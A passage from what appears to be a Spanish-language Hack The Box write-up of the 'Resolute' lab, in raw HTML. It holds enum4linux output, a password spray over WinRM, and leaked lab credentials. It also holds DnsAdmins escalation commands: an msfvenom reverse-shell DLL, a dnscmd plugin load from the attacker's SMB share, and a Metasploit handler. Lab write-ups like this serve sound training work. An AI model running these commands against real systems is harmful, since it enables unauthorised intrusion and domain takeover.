group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x201&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Guests&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x202&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Computers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x203&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x204&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Schema Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x206&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Enterprise Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x207&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Group Policy Creator Owners&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x208&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Read-only Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x209&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Cloneable Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Protected Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Key Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Enterprise Key Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DnsUpdateProxy&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Contractors&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting domain group memberships:
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;efaultAccount
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\k&lt;/span&gt;rbtgt
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;yan
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;arko
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;unita
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;bigail
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;arcus
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ally
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;red
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ngela
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;elicia
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\g&lt;/span&gt;ustavo
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;lf
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;tevie
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;laire
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;aulo
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;teve
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;nnette
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;nnika
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;er
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;laude
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;elanie
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\z&lt;/span&gt;ach
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;imon
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;aoki
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Contractors&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 1103&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;yan
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Enterprise Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Group Policy Creator Owners&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 520&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Controllers&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 516&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;ESOLUTE$
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Schema Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 518&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Computers&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 515&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;S02$
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Guests&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 514&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\G&lt;/span&gt;uest
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 512&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator

 &lt;span class=&#34;o&#34;&gt;=======================================================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Users on 10.10.10.169 via RID cycling &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RIDS: 500-550,1000-1050&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;=======================================================================&lt;/span&gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;E&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Couldn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 &lt;span class=&#34;o&#34;&gt;=============================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Getting printer info &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.169    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;=============================================&lt;/span&gt; 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
enum4linux &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt; on Mon Jan  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 16:32:54 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Enum4linux nos muestra la lista de grupos, usuarios, dominio, entre mucha otra informacion de interes, pero especificamente en la parte de usuarios nos muestra un comentario del usuario marko, el cual contiene un comentario en la descripcion y nos indica que la contraseña que le fue impuesta a este usuario es &lt;strong&gt;Welcome123!&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to Welcome123!
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al intentar iniciar sesion o enumerar los SHARENAMES con smbmap y smbclient junto con las credenciales, no fue posible, utilizamos &lt;code&gt;evil-winrm&lt;/code&gt;, ya que el puerto 5985 de winrm esta abierto en la maquina para intentar ingresar en ese puerto, pero nos muestra un mensaje de error de Autenticacion.&lt;/p&gt;
&lt;h2 id=&#34;user---melanie&#34;&gt;User - Melanie&lt;/h2&gt;
&lt;p&gt;Sin descartar la contraseña que encontramos utilizamos un pequeño diccionario con los usuarios disponibles en la maquina y, junto a un pequeño script de bash y evil-winrm, intentar con cada usuario la contraseña &lt;strong&gt;Welcome123!&lt;/strong&gt;. Al hacer esto logramos que la usuario Melanie iniciara sesion satisfactoriamente en winrm, obteniendo asi una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-06_20-06-36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---ryan&#34;&gt;User - Ryan&lt;/h2&gt;
&lt;p&gt;Al ingresar a la maquina hicimos una enumeracion de archivos, en el dsco &lt;code&gt;C:/&lt;/code&gt; encontramos un archivo que contiene un log de ejecucion de comandos, entre los comandos vemos que se utilizó net use junto con un usuario y una contraseña que pertenecen a &lt;code&gt;ryan&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-06_20-10-25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ryan:Serv3r4Admin4cc123!
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;privilege-escalation---abusing-dnsadmins&#34;&gt;PRIVILEGE ESCALATION - Abusing DNSAdmins&lt;/h2&gt;
&lt;p&gt;Utilizamos evil-winrm nuevamente para obtener una shell con el usuario ryan, enumeramos los grupos en los que el usuario se encuentra (Domain Users, Contractors).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-06_23-27-28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;whoami /groups&lt;/code&gt; nos da mejor informacion sobre este usuario, vemos que ryan pertenece a varios grupos, uno de ellos es &lt;code&gt;MEGABANK\DnsAdmins&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-06_23-29-51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que ryan pertenece a DnsAdmins vamos a explotar sus privilegios para poder cargar un fichero DLL con privilegios de administrador en el Servidor de DNS que la maquina tiene corriendo.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html&#34;&gt;&lt;strong&gt;Abusing DNSAdmins&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Primero vamos a crear un archivo DLL con msfvenom para ejecutar una shell inversa hacia nuestra maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfvenom -p windows/x64/shell_reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tun0 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt; --platform&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;windows -f dll &amp;gt; revshell.dll
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos un servidor de SAMBA utilizando las herramientas de impacket y ponemos a la escucha netcat en nuestra maquina o de igual forma con metasploit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python smbserver.py DLL .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ya que el servidor DNS esta corriendo sobre el Domain Controller (DC) podemos utilizar simplemente dnscmd para poder cargar el DLL.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;dnscmd /config /serverlevelplugindll &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.15.105&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;LL&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;evshell.dll
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Luego de ello vamos a parar e iniciar el servidor DNS nuevamente.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sc.exe stop dns; sc.exe start dns
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Obtenemos una respuesta en nuestro servidor SMB y nuestra shell con privilegios de Administrador.&lt;/p&gt;
&lt;p&gt;SMB:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-07_19-03-15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una sesion en Metasploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/x64/shell_reverse_tcp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Accepted: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, seh, thread, process, none&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   LHOST     10.10.15.105     yes       The listen address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   LPORT     &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt;             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Wildcard Target

msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; exploit 

